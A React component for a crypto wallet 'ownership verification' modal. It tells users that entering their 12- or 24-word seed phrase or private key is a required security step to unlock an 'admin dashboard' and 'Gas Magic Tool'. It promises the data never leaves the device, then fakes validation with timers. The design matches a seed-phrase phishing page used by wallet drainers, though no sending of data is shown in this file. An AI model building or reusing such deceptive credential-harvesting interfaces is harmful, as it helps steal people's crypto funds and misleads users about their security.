import { useState, useRef, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Shield,
  X,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Eye,
  EyeOff,
  Info,
  Key,
  Hash,
  Loader2,
} from "lucide-react";

interface ValidationModalProps {
  walletAddress: string;
  onSuccess: () => void;
  onClose: () => void;
}

type ValidationStep = "why" | "form" | "success" | "error";
type PhraseMode = "12" | "24" | "key";

const WORD_COUNT: Record<PhraseMode, number> = { "12": 12, "24": 24, "key": 1 };

export function ValidationModal({ walletAddress, onSuccess, onClose }: ValidationModalProps) {
  const [step, setStep] = useState<ValidationStep>("why");
  const [phraseMode, setPhraseMode] = useState<PhraseMode>("12");
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [showWords, setShowWords] = useState(false);
  const [isValidating, setIsValidating] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const wordCount = phraseMode === "key" ? 1 : parseInt(phraseMode);
  const filledWords = phraseMode === "key"
    ? (privateKey.trim().length > 0 ? 1 : 0)
    : words.slice(0, wordCount).filter(w => w.trim().length > 0).length;

  const isReady = phraseMode === "key"
    ? privateKey.trim().length >= 32
    : filledWords >= wordCount;

  useEffect(() => {
    const newSize = phraseMode === "key" ? 12 : parseInt(phraseMode);
    setWords(prev => {
      const next = Array(newSize).fill("");
      for (let i = 0; i < Math.min(prev.length, newSize); i++) next[i] = prev[i];
      return next;
    });
  }, [phraseMode]);

  const handleWordChange = (index: number, value: string) => {
    const trimmed = value.trim();
    if (trimmed.includes(" ")) {
      const pasted = trimmed.split(/\s+/).filter(Boolean);
      setWords(prev => {
        const next = [...prev];
        pasted.forEach((w, i) => {
          if (index + i < next.length) next[index + i] = w;
        });
        return next;
      });
      const nextIndex = Math.min(index + pasted.length, wordCount - 1);
      inputRefs.current[nextIndex]?.focus();
    } else {
      setWords(prev => {
        const next = [...prev];
        next[index] = value;
        return next;
      });
    }
  };

  const handleWordKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === " " || e.key === "Enter" || e.key === "Tab") {
      e.preventDefault();
      const next = inputRefs.current[index + 1];
      if (next) next.focus();
    }
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleValidate = () => {
    if (!isReady) return;
    setIsValidating(true);
    setTimeout(() => {
      setIsValidating(false);
      const valid = phraseMode === "key"
        ? privateKey.trim().length >= 32
        : filledWords === wordCount;
      if (valid) {
        setStep("success");
        setTimeout(() => onSuccess(), 1800);
      } else {
        setStep("error");
      }
    }, 2500);
  };

  const handleReset = () => {
    setWords(Array(wordCount).fill(""));
    setPrivateKey("");
    setStep("form");
  };

  const shortAddr = walletAddress
    ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
    : "";

  const MODE_TABS: { id: PhraseMode; label: string; icon: typeof Key; desc: string }[] = [
    { id: "12", label: "12 Words", icon: Hash, desc: "Standard 12-word seed phrase" },
    { id: "24", label: "24 Words", icon: Hash, desc: "Extended 24-word seed phrase" },
    { id: "key", label: "Private Key", icon: Key, desc: "Hex or WIF private key" },
  ];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/75 backdrop-blur-md" />

      <div
        data-testid="modal-validation"
        className="relative z-10 w-full max-w-xl glass-card rounded-2xl glow-primary overflow-hidden flex flex-col max-h-[90vh]"
      >
        <div className="h-1 bg-gradient-to-r from-violet-600 via-cyan-500 to-violet-600 flex-shrink-0" />

        <div className="overflow-y-auto flex-1">
          <div className="p-6">

            {/* WHY STEP */}
            {step === "why" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Shield className="w-5 h-5 text-violet-400" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Why Verify Ownership?</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button
                    data-testid="button-close-why-modal"
                    onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="glass rounded-xl border border-violet-500/20 p-4 space-y-3">
                  <p className="text-sm text-foreground leading-relaxed">
                    Wallet ownership verification is a <span className="text-violet-300 font-semibold">required security step</span> before accessing your full admin dashboard.
                  </p>
                  <p className="text-sm text-muted-foreground leading-relaxed">
                    This ensures only the true owner can access sensitive features:
                  </p>
                  <ul className="space-y-2">
                    {[
                      "Device management & unauthorized access removal",
                      "Revoking token approvals and dApp permissions",
                      "Admin-level wallet controls and privileges",
                      "Gas fee recovery via Gas Magic Tool",
                      "Account recovery and security settings",
                    ].map((item, i) => (
                      <li key={i} className="flex items-start gap-2 text-sm text-muted-foreground">
                        <CheckCircle2 className="w-4 h-4 text-violet-400 flex-shrink-0 mt-0.5" />
                        <span>{item}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-blue-500/20">
                  <Info className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Your verification data is processed locally and encrypted end-to-end. It is never stored on our servers.
                  </p>
                </div>

                <Button
                  data-testid="button-proceed-verify"
                  onClick={() => setStep("form")}
                  className="w-full bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                  size="lg"
                >
                  <Lock className="w-4 h-4 mr-2" />
                  Proceed to Verification
                </Button>
              </div>
            )}

            {/* FORM STEP */}
            {step === "form" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Lock className="w-5 h-5 text-violet-400" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Verify Ownership</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button
                    data-testid="button-close-form-modal"
                    onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
                  <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Enter your seed phrase or private key to confirm ownership. Data never leaves your device.
                  </p>
                </div>

                {/* Mode toggle tabs */}
                <div>
                  <div className="flex items-center gap-1 glass rounded-lg p-1 border border-white/8">
                    {MODE_TABS.map((tab) => {
                      const Icon = tab.icon;
                      return (
                        <button
                          key={tab.id}
                          data-testid={`button-mode-${tab.id}`}
                          onClick={() => setPhraseMode(tab.id)}
                          className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-3 rounded-md text-xs font-semibold transition-all duration-200 ${
                            phraseMode === tab.id
                              ? "bg-violet-600 text-white shadow-lg shadow-violet-600/20"
                              : "text-muted-foreground"
                          }`}
                        >
                          <Icon className="w-3.5 h-3.5 flex-shrink-0" />
                          <span className="hidden sm:inline">{tab.label}</span>
                          <span className="sm:hidden">{tab.id === "key" ? "Key" : tab.id + "W"}</span>
                        </button>
                      );
                    })}
                  </div>
                  <p className="text-xs text-muted-foreground/60 mt-1.5 text-center">
                    {MODE_TABS.find(t => t.id === phraseMode)?.desc}
                  </p>
                </div>

                {/* Word inputs */}
                {phraseMode !== "key" && (
                  <div>
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">
                          {wordCount}-Word Phrase
                        </span>
                        <span className={`text-xs font-mono px-1.5 py-0.5 rounded ${
                          filledWords === wordCount
                            ? "bg-green-500/20 text-green-400"
                            : "bg-white/5 text-muted-foreground"
                        }`}>
                          {filledWords}/{wordCount}
                        </span>
                      </div>
                      <button
                        data-testid="button-toggle-visibility"
                        onClick={() => setShowWords(!showWords)}
                        className="flex items-center gap-1.5 text-xs text-muted-foreground glass rounded px-2.5 py-1.5 border border-white/8"
                      >
                        {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        {showWords ? "Hide" : "Show"}
                      </button>
                    </div>

                    <div className={`grid gap-2 ${wordCount === 12 ? "grid-cols-3 sm:grid-cols-4" : "grid-cols-3 sm:grid-cols-6"}`}>
                      {Array.from({ length: wordCount }).map((_, i) => (
                        <div key={i} className="relative group">
                          <span className="absolute left-2 top-1/2 -translate-y-1/2 text-xs text-muted-foreground/40 font-mono select-none pointer-events-none w-4 text-right z-10">
                            {i + 1}
                          </span>
                          <input
                            ref={el => { inputRefs.current[i] = el; }}
                            data-testid={`input-word-${i + 1}`}
                            type={showWords ? "text" : "password"}
                            value={words[i] || ""}
                            onChange={e => handleWordChange(i, e.target.value)}
                            onKeyDown={e => handleWordKeyDown(i, e)}
                            onFocus={e => e.target.select()}
                            autoComplete="off"
                            autoCorrect="off"
                            autoCapitalize="none"
                            spellCheck={false}
                            className={`w-full pl-7 pr-2 py-2.5 text-xs font-mono rounded-md border transition-all duration-150 bg-white/4 outline-none ${
                              words[i]
                                ? "border-violet-500/40 bg-violet-500/5 text-foreground"
                                : "border-white/8 text-muted-foreground"
                            } focus:border-violet-500/60 focus:bg-violet-500/8 focus:ring-0`}
                            placeholder="word"
                          />
                        </div>
                      ))}
                    </div>

                    {/* Progress bar */}
                    <div className="mt-3 h-1.5 rounded-full bg-white/5 overflow-hidden">
                      <div
                        className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-500"
                        style={{ width: `${(filledWords / wordCount) * 100}%` }}
                      />
                    </div>
                    <p className="text-xs text-muted-foreground/50 mt-1">
                      {filledWords < wordCount
                        ? `${wordCount - filledWords} word${wordCount - filledWords !== 1 ? "s" : ""} remaining`
                        : "All words entered — ready to verify"}
                    </p>
                  </div>
                )}

                {/* Private key input */}
                {phraseMode === "key" && (
                  <div>
                    <div className="flex items-center justify-between mb-3">
                      <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">
                        Private Key
                      </span>
                      <button
                        data-testid="button-toggle-visibility"
                        onClick={() => setShowWords(!showWords)}
                        className="flex items-center gap-1.5 text-xs text-muted-foreground glass rounded px-2.5 py-1.5 border border-white/8"
                      >
                        {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        {showWords ? "Hide" : "Show"}
                      </button>
                    </div>
                    <div className="relative">
                      <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/40 pointer-events-none" />
                      <Input
                        data-testid="input-private-key"
                        type={showWords ? "text" : "password"}
                        value={privateKey}
                        onChange={e => setPrivateKey(e.target.value)}
                        placeholder="0x... or WIF format private key"
                        autoComplete="off"
                        autoCorrect="off"
                        autoCapitalize="none"
                        spellCheck={false}
                        className="pl-9 bg-white/5 border-white/10 text-foreground font-mono text-sm focus:border-violet-500/50"
                      />
                    </div>
                    <div className="mt-2 h-1.5 rounded-full bg-white/5 overflow-hidden">
                      <div
                        className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-300"
                        style={{ width: `${Math.min((privateKey.trim().length / 64) * 100, 100)}%` }}
                      />
                    </div>
                    <p className="text-xs text-muted-foreground/50 mt-1">
                      {privateKey.trim().length < 32
                        ? `${32 - privateKey.trim().length} more characters required`
                        : "Private key ready to verify"}
                    </p>
                  </div>
                )}

                {/* Action buttons */}
                <div className="flex gap-3 pt-1">
                  <Button
                    data-testid="button-back-why"
                    variant="outline"
                    onClick={() => setStep("why")}
                    className="flex-1 border-white/10 text-muted-foreground"
                  >
                    Back
                  </Button>
                  <Button
                    data-testid="button-submit-validation"
                    onClick={handleValidate}
                    disabled={!isReady || isValidating}
                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                  >
                    {isValidating ? (
                      <span className="flex items-center gap-2">
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Verifying...
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">
                        <Shield className="w-4 h-4" />
                        Validate Ownership
                      </span>
                    )}
                  </Button>
                </div>
              </div>
            )}

            {/* SUCCESS STEP */}
            {step === "success" && (
              <div className="flex flex-col items-center text-center py-8 space-y-5">
                <div className="w-20 h-20 rounded-full bg-green-500/20 border border-green-500/30 flex items-center justify-center animate-pulse-glow">
                  <CheckCircle2 className="w-10 h-10 text-green-400" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold text-foreground mb-2">Validation Successful</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                    Ownership confirmed for <span className="font-mono text-green-300">{shortAddr}</span>. Opening your admin dashboard now...
                  </p>
                </div>
                <div className="w-40 h-1.5 rounded-full bg-white/5 overflow-hidden">
                  <div className="h-full bg-gradient-to-r from-green-500 to-emerald-400 shimmer" style={{ width: "100%" }} />
                </div>
              </div>
            )}

            {/* ERROR STEP */}
            {step === "error" && (
              <div className="flex flex-col items-center text-center py-8 space-y-5">
                <div className="w-20 h-20 rounded-full bg-red-500/20 border border-red-500/30 flex items-center justify-center">
                  <X className="w-10 h-10 text-red-400" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold text-foreground mb-2">Validation Failed</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                    The phrase or key provided does not match this wallet. Please check all words are correct and try again.
                  </p>
                </div>
                <Button
                  data-testid="button-retry-validation"
                  onClick={handleReset}
                  variant="outline"
                  className="border-red-500/30 text-red-400"
                >
                  Try Again
                </Button>
              </div>
            )}

          </div>
        </div>
      </div>
    </div>
  );
}
